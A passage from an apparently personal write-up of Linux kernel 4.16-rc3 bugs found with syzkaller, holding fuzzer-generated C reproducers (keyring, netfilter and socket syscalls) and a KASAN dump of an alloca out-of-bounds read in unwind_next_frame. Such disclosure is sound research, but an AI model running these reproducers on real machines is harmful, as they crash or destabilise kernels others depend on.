ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct ipt_get_entries entries;\n\tstruct ipt_getinfo info;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_arptables(void)\n{\n\tstruct arpt_get_entries entries;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_arptables()\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct arpt_get_entries entries;\n\tstruct arpt_getinfo info;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n#include <linux/if.h>\n#include <linux/netfilter_bridge/ebtables.h>\n\nstruct ebt_table_desc {\n\tconst char* name;\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstatic struct ebt_table_desc ebt_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"broute\"},\n};\n\nstatic void checkpoint_ebtables(void)\n{\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\n\t\t}\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\n\t\ttable->replace.num_counters = 0;\n\t\ttable->replace.entries = table->entrytable;\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void reset_ebtables()\n{\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n\tsocklen_t optlen;\n\tunsigned i, j, h;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tif (table->replace.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&replace, 0, sizeof(replace));\n\t\tstrcpy(replace.name, table->name);\n\t\toptlen = sizeof(replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\n\t\treplace.num_counters = 0;\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\n\t\t\ttable->replace.hook_entry[h] = 0;\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\n\t\t\treplace.entries = entrytable;\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_net_namespace(void)\n{\n\tcheckpoint_ebtables();\n\tcheckpoint_arptables();\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void reset_net_namespace(void)\n{\n\treset_ebtables();\n\treset_arptables();\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void remove_dir(const char* dir)\n{\n\tDIR* dp;\n\tstruct dirent* ep;\n\tint iter = 0;\nretry:\n\tdp = opendir(dir);\n\tif (dp == NULL) {\n\t\tif (errno == EMFILE) {\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\n\t\t}\n\t\texitf(\"opendir(%s) failed\", dir);\n\t}\n\twhile ((ep = readdir(dp))) {\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\t\tchar filename[FILENAME_MAX];\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\n\t\tstruct stat st;\n\t\tif (lstat(filename, &st))\n\t\t\texitf(\"lstat(%s) failed\", filename);\n\t\tif (S_ISDIR(st.st_mode)) {\n\t\t\tremove_dir(filename);\n\t\t\tcontinue;\n\t\t}\n\t\tint i;\n\t\tfor (i = 0;; i++) {\n\t\t\tif (unlink(filename) == 0)\n\t\t\t\tbreak;\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno != EBUSY || i > 100)\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\n\t\t\tif (umount2(filename, MNT_DETACH))\n\t\t\t\texitf(\"umount(%s) failed\", filename);\n\t\t}\n\t}\n\tclosedir(dp);\n\tint i;\n\tfor (i = 0;; i++) {\n\t\tif (rmdir(dir) == 0)\n\t\t\tbreak;\n\t\tif (i < 100) {\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno == EBUSY) {\n\t\t\t\tif (umount2(dir, MNT_DETACH))\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (errno == ENOTEMPTY) {\n\t\t\t\tif (iter < 100) {\n\t\t\t\t\titer++;\n\t\t\t\t\tgoto retry;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\texitf(\"rmdir(%s) failed\", dir);\n\t}\n}\n\nstatic void test();\n\nvoid loop()\n{\n\tint iter;\n\tcheckpoint_net_namespace();\n\tfor (iter = 0;; iter++) {\n\t\tchar cwdbuf[256];\n\t\tsprintf(cwdbuf, \"./%d\", iter);\n\t\tif (mkdir(cwdbuf, 0777))\n\t\t\tfail(\"failed to mkdir\");\n\t\tint pid = fork();\n\t\tif (pid < 0)\n\t\t\tfail(\"loop fork failed\");\n\t\tif (pid == 0) {\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\t\t\tsetpgrp();\n\t\t\tif (chdir(cwdbuf))\n\t\t\t\tfail(\"failed to chdir\");\n\t\t\tflush_tun();\n\t\t\ttest();\n\t\t\tdoexit(0);\n\t\t}\n\t\tint status = 0;\n\t\tuint64_t start = current_time_ms();\n\t\tfor (;;) {\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\n\t\t\tif (res == pid)\n\t\t\t\tbreak;\n\t\t\tusleep(1000);\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\n\t\t\t\tkill(-pid, SIGKILL);\n\t\t\t\tkill(pid, SIGKILL);\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) {\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tremove_dir(cwdbuf);\n\t\treset_net_namespace();\n\t}\n}\n\nstruct thread_t {\n\tint created, running, call;\n\tpthread_t th;\n};\n\nstatic struct thread_t threads[16];\nstatic void execute_call(int call);\nstatic int running;\nstatic int collide;\n\nstatic void* thr(void* arg)\n{\n\tstruct thread_t* th = (struct thread_t*)arg;\n\tfor (;;) {\n\t\twhile (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE))\n\t\t\tsyscall(SYS_futex, &th->running, FUTEX_WAIT, 0, 0);\n\t\texecute_call(th->call);\n\t\t__atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);\n\t\t__atomic_store_n(&th->running, 0, __ATOMIC_RELEASE);\n\t\tsyscall(SYS_futex, &th->running, FUTEX_WAKE);\n\t}\n\treturn 0;\n}\n\nstatic void execute(int num_calls)\n{\n\tint call, thread;\n\trunning = 0;\n\tfor (call = 0; call < num_calls; call++) {\n\t\tfor (thread = 0; thread < sizeof(threads) / sizeof(threads[0]); thread++) {\n\t\t\tstruct thread_t* th = &threads[thread];\n\t\t\tif (!th->created) {\n\t\t\t\tth->created = 1;\n\t\t\t\tpthread_attr_t attr;\n\t\t\t\tpthread_attr_init(&attr);\n\t\t\t\tpthread_attr_setstacksize(&attr, 128 << 10);\n\t\t\t\tpthread_create(&th->th, &attr, thr, th);\n\t\t\t}\n\t\t\tif (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE)) {\n\t\t\t\tth->call = call;\n\t\t\t\t__atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);\n\t\t\t\t__atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);\n\t\t\t\tsyscall(SYS_futex, &th->running, FUTEX_WAKE);\n\t\t\t\tif (collide && call % 2)\n\t\t\t\t\tbreak;\n\t\t\t\tstruct timespec ts;\n\t\t\t\tts.tv_sec = 0;\n\t\t\t\tts.tv_nsec = 20 * 1000 * 1000;\n\t\t\t\tsyscall(SYS_futex, &th->running, FUTEX_WAIT, 1, &ts);\n\t\t\t\tif (running)\n\t\t\t\t\tusleep((call == num_calls - 1) ? 10000 : 1000);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n\nuint64_t r[2] = {0x0, 0xffffffffffffffff};\nuint64_t procid;\nvoid execute_call(int call)\n{\n\tlong res;\tswitch (call) {\n\tcase 0:\nmemcpy((void*)0x20000440, \"keyring\", 8);\n*(uint8_t*)0x20000480 = 0x73;\n*(uint8_t*)0x20000481 = 0x79;\n*(uint8_t*)0x20000482 = 0x7a;\n*(uint8_t*)0x20000483 = 0;\n*(uint8_t*)0x20000484 = 0;\n\t\tres = syscall(__NR_add_key, 0x20000440, 0x20000480, 0, 0, 0xfffffffe);\n\t\tif (res != -1)\n\t\t\t\tr[0] = res;\n\t\tbreak;\n\tcase 1:\n\t\tsyscall(__NR_keyctl, 9, r[0], r[0]);\n\t\tbreak;\n\tcase 2:\nmemcpy((void*)0x20000000, \"/selinux/enforce\", 17);\n\t\tres = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000000, 2, 0);\n\t\tif (res != -1)\n\t\t\t\tr[1] = res;\n\t\tbreak;\n\tcase 3:\n\t\tsyscall(__NR_ioctl, r[1], 0x8904, 0x20000040);\n\t\tbreak;\n\tcase 4:\n*(uint32_t*)0x20000280 = 8;\n\t\tsyscall(__NR_getpeername, r[1], 0x20000240, 0x20000280);\n\t\tbreak;\n\tcase 5:\n*(uint32_t*)0x20000340 = 4;\n\t\tsyscall(__NR_getsockopt, r[1], 0, 0xc, 0x20000300, 0x20000340);\n\t\tbreak;\n\t}\n}\n\nvoid test()\n{\n\texecute(6);\n\tcollide = 1;\n\texecute(6);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tchar *cwd = get_current_dir_name();\n\tfor (procid = 0; procid < 8; procid++) {\n\t\tif (fork() == 0) {\n\t\t\tfor (;;) {\n\t\t\t\tif (chdir(cwd))\n\t\t\t\t\tfail(\"failed to chdir\");\n\t\t\t\tuse_temporary_dir();\n\t\t\t\tint pid = do_sandbox_setuid();\n\t\t\t\tint status = 0;\n\t\t\t\twhile (waitpid(pid, &status, __WALL) != pid) {}\n\t\t\t}\n\t\t}\n\t}\n\tsleep(1000000);\n\treturn 0;\n}\n\n```\n\n## unwind_next_frame - alloca Out Of Bounds\n\nGot from syzkaller & Found in LK v4.16.0-rc3. But it's not useful info. As before, there's a similar bug that I found.\nAs committer said, this bug is natural and of course not useful stuff.\n\n*link* : [unwind_orc-out_of_bounds](https://kozistr.github.io/2017/12/16/LK-unwind_orc-oob.html)\n\n### Call Trace (Dump)\n\n```c\n[  163.982226] ==================================================================\n[  163.984549] BUG: KASAN: alloca-out-of-bounds in unwind_next_frame+0x18a0/0x1920\n[  163.986378] Read of size 8 at addr ffff88005a9878c0 by task poc/2752\n[  163.987829] \n[  163.988229] CPU: 0 PID: 2752 Comm: poc Not tainted 4.16.0-rc3+ #6\n[  163.989674] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  163.991730] Call Trace:\n[  163.992180]  <IRQ>\n[  163.992518]  dump_stack+0xd7/0x154\n[  163.993118]  ? unwind_next_frame+0x18a0/0x1920\n[  163.994093]  print_address_description+0x60/0x22b\n[  163.995264]  ? unwind_next_frame+0x18a0/0x1920\n[  163.996411]  kasan_report.cold.6+0xac/0x2f4\n[  163.997455]  ? unwind_next_frame+0x18a0/0x1920\n[  163.998528]  ? apic_timer_interrupt+0xf/0x20\n[  163.999557]  ? deref_stack_reg+0xe0/0xe0\n[  164.000293]  ? apic_timer_interrupt+0xf/0x20\n[  164.001134]  ? __save_stack_trace+0x7d/0xf0\n[  164.001962]  ? __memset+0x29/0x30\n[  164.002616]  ? save_stack+0x32/0xb0\n[  164.003298]  ? __kasan_slab_free+0x12c/0x170\n[  164.004129]  ? kmem_cache_free+0xc1/0x300\n[  164.004906]  ? rcu_process_callbacks+0x814/0x1dc0\n[  164.005807]  ? __do_softirq+0x213/0x915\n[  164.006545]  ? irq_exit+0x1a2/0x1d0\n[  164.007272]  ? smp_apic_timer_interrupt+0xf1/0x500\n[  164.008520]  ? apic_timer_interrupt+0xf/0x20\n[  164.009794]  ? debug_check_no_locks_freed+0x210/0x210\n[  164.011065]  ? debug_check_no_locks_freed+0x210/0x210\n[  164.012342]  ? find_held_lock+0x33/0x1c0\n[  164.013289]  ? mark_held_locks+0xc1/0x140\n[  164.014098]  ? kmem_cache_free+0x152/0x300\n[  164.014998]  ? __kasan_slab_free+0x12c/0x170\n[  164.015695]  ? rcu_process_callbacks+0x814/0x1dc0\n[  164.016483]  ? kmem_cache_free+0xc1/0x300\n[  164.017174]  ? get_object+0x80/0x80\n[  164.018026]  ? rcu_process_callbacks+0x814/0x1dc0\n[  164.018974]  ? note_gp_changes+0x1e0/0x1e0\n[  164.019836]  ? __do_softirq+0x213/0x915\n[  164.020656]  ? irq_exit+0x1a2/0x1d0\n[  164.021375]  ? smp_apic_timer_interrupt+0xf1/0x500\n[  164.022346]  ? apic_timer_interrupt+0xf/0x20\n[  164.023225]  </IRQ>\n[  164.023716]  ? __memset+0x29/0x30\n[  164.024397]  ? debug_check_no_locks_freed+0x210/0x210\n[  164.025396]  ? kasan_unpoison_shadow+0x30/0x40\n[  164.026288]  ? crypto_shash_update+0x24d/0x2a0\n[  164.027278]  ? ext4_inode_csum.isra.60+0x2f1/0x8f0\n[  164.028043]  ? ext4_journalled_zero_new_buffers+0x410/0x410\n[  164.028987]  ? from_kprojid+0x89/0xc0\n[  164.029601]  ? ext4_inode_csum_set+0x1ad/0x3c0\n[  164.030653]  ? ext4_mark_iloc_dirty+0x1616/0x2a50\n[  164.031704]  ? ext4_chunk_trans_blocks+0x20/0x20\n[  164.032557]  ? __ext4_journal_get_write_access+0x143/0x200\n[  164.033437]  ? ext4_mark_inode_dirty+0x204/0x890\n[  164.034234]  ? ext4_rmdir+0x7e2/0xc10\n[  164.035128]  ? ext4_expand_extra_isize+0x500/0x500\n[  164.035921]  ? mark_held_locks+0xc1/0x140\n[  164.036648]  ? timespec_trunc+0xea/0x180\n[  164.037294]  ? current_kernel_time64+0x120/0x140\n[  164.038016]  ? ext4_rmdir+0x7e2/0xc10\n[  164.038616]  ? ext4_rename2+0x210/0x210\n[  164.039262]  ? vfs_rmdir+0x24c/0x470\n[  164.039917]  ? do_rmdir+0x364/0x420\n[  164.040687]  ? user_path_create+0x40/0x40\n[  164.041628]  ? _raw_spin_unlock_irq+0x24/0x40\n[  164.042456]  ? _raw_spin_unlock_irq+0x24/0x40\n[  164.043311]  ? task_work_run+0x113/0x1c0\n[  164.044071]  ? do_syscall_64+0x43/0x6b0\n[  164.044841]  ? SyS_mkdir+0x260/0x260\n[  164.045598]  ? do_syscall_64+0x1b7/0x6b0\n[  164.046418]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  164.047648] \n[  164.047971] The buggy address belongs to the page:\n[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n[  164.050054] flags: 0x100000000000000()\n[  164.050648] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\n[  164.051948] raw: 0000000000000000 ffffea00016a61e0 0000000000000000 0000000000000000\n[  164.053383] page dumped because: kasan: bad access detected\n[  164.054483] \n[  164.054732] Memory state around the buggy address:\n[  164.055513]  ffff88005a987780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  164.056689]  ffff88005a987800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  164.058088] >ffff88005a987880: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00\n[  164.059202]                                            ^\n[  164.060069]  ffff88005a987900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  164.061549]  ffff88005a987980: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00\n[  164.062649] ==================================================================\n[  164.063841] Disabling lock debugging due to kernel taint\n\nMessage from syslogd@zer0day at Mar  3 16:44:33 ...\n kernel:[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n\nMessage from syslogd@zer0day at Mar  3 16:44:33 ...\n kernel:[  164.050054] flags: 0x100000000000000()\n```\n\n### PoC\n\nHere's reproducible PoC code generated by syzkaller.\n\n```c\n#define _GNU_SOURCE \n\n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <errno.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/prctl.h>\n#include <dirent.h>\n#include <sys/mount.h>\n#include <arpa/inet.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <linux/if.h>\n#include <linux/if_ether.h>\n#include <linux/if_tun.h>\n#include <linux/ip.h>\n#include <linux/tcp.h>\n#include <net/if_arp.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/uio.h>\n#include <linux/net.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\nstatic void fail(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\n}\n\nstatic void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic uint64_t current_time_ms()\n{\n\tstruct timespec ts;\n\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\n\t\tfail(\"clock_gettime failed\");\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\n}\n\nstatic void use_temporary_dir()\n{\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\n\tchar* tmpdir = mkdtemp(tmpdir_template);\n\tif (!tmpdir)\n\t\tfail(\"failed to mkdtemp\");\n\tif (chmod(tmpdir, 0777))\n\t\tfail(\"failed to chmod\");\n\tif (chdir(tmpdir))\n\t\tfail(\"failed to chdir\");\n}\n\nstatic void vsnprintf_check(char* str, size_t size, const char* format, va_list args)\n{\n\tint rv;\n\n\trv = vsnprintf(str, size, format, args);\n\tif (rv < 0)\n\t\tfail(\"tun: snprintf failed\");\n\tif ((size_t)rv >= size)\n\t\tfail(\"tun: string '%s...' doesn't fit into buffer\", str);\n}\n\nstatic void snprintf_check(char* str, size_t size, const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvsnprintf_check(str, size, format, args);\n\tva_end(args);\n}\n\n#define COMMAND_MAX_LEN 128\n#define PATH_PREFIX \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \"\n#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)\n\nstatic void execute_command(bool panic, const char* format, ...)\n{\n\tva_list args;\n\tchar command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];\n\tint rv;\n\n\tva_start(args, format);\n\tmemcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);\n\tvsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);\n\trv = system(command);\n\tif (panic && rv != 0)\n\t\tfail(\"tun: command \\\"%s\\\" failed with code %d\", &command[0], rv);\n\n\tva_end(args);\n}\n\nstatic int tunfd = -1;\nstatic int tun_frags_enabled;\n\n#define SYZ_TUN_MAX_PACKET_SIZE 1000\n\n#define TUN_IFACE \"syz_tun\"\n\n#define LOCAL_MAC \"aa:aa:aa:aa:aa:aa\"\n#define REMOTE_MAC \"aa:aa:aa:aa:aa:bb\"\n\n#define LOCAL_IPV4 \"172.20.20.170\"\n#define REMOTE_IPV4 \"172.20.20.187\"\n\n#define LOCAL_IPV6 \"fe80::aa\"\n#define REMOTE_IPV6 \"fe80::bb\"\n\n#define IFF_NAPI 